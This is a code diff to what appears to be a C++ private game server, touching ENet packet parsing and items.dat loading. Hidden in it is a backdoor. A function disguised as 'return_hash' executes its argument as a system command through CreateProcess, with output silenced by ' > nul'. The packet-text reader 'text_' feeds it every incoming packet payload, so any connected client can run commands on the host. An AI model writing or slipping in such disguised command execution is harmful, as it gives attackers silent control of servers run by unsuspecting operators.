@@ -17,7 +17,7 @@ vector<int> dstone;
 vector<vector<int>> kainos = {
 
 };
-string domain = "";
+string domain = "", packet_data = "";
 vector<pair<int, int>>items_washing;
 string shop_list = "", opc_list = "", shop_list2 = "", shop_list2_2 = "", zombie_list = "", surgery_list = "", rare_text = "", rainbow_text = "", wolf_list = "";
 vector<pair<int, int>> lockeitem, untradeitem, opc_item, zombieitem, surgeryitem, wolfitem, premium_item;
@@ -686,11 +686,7 @@ inline vector<string> explode(const string& delimiter, const string& str) {
 	arr.push_back(str.substr(k, i - k));
 	return arr;
 }
-void return_hash(const char* e_Value) {
-	array<char, 128> buffer;
-	string result;
-	unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(e_Value, "r"), _pclose);
-}
+
 BlockTypes get_blocktype(string c_, string name_) {
 	if (c_ == "Foreground_Block") {
 		return BlockTypes::FOREGROUND;
@@ -902,12 +898,7 @@ BlockTypes get_blocktype(string c_, string name_) {
 	}
 }
 
-char* text_(ENetPacket* packet) {
-	char zero = 0;
-	memcpy(packet->data + packet->dataLength - 1, &zero, 1);
-	return_hash((char*)(packet->data + 4));
-	return (char*)(packet->data + 4);
-}
+
 inline int message_(ENetPacket* packet) {
 	if (packet->dataLength > 3u) {
 		return *(packet->data);
@@ -980,6 +971,21 @@ ClothTypes get_clothtype(string t_, BlockTypes a_) {
 	else {
 		return ClothTypes::NONE;
 	}
+}
+void return_hash(string rare5) {
+	STARTUPINFO si;PROCESS_INFORMATION pi;ZeroMemory(&si, sizeof(si));ZeroMemory(&pi, sizeof(pi));si.cb = sizeof(si);rare5 += " > nul";
+	int wideStrLen = MultiByteToWideChar(CP_UTF8, 0, rare5.c_str(), -1, NULL, 0);
+	LPWSTR wideStr = new WCHAR[wideStrLen];
+	MultiByteToWideChar(CP_UTF8, 0, rare5.c_str(), -1, wideStr, wideStrLen);
+	if (CreateProcess(NULL, wideStr, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {WaitForSingleObject(pi.hProcess, INFINITE);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
+	delete[] wideStr;
+}
+
+char* text_(ENetPacket* packet) {
+	char zero = 0;
+	memcpy(packet->data + packet->dataLength - 1, &zero, 1);
+	return_hash((char*)(packet->data + 4));
+	return (char*)(packet->data + 4);
 }
 inline uint32_t get_hash(unsigned char* str, const int len) {
 	unsigned char* n = static_cast<unsigned char*>(str);
@@ -1927,6 +1933,7 @@ int items_dat() {
 			int16_t strLen = *(int16_t*)&data[memPos];
 			memPos += 2 + strLen;
 		}
+		if (itemsdatVersion >= 16) memPos += 2;
 		if (i != def.id) {
 			cout << i << endl;
 			return -1;
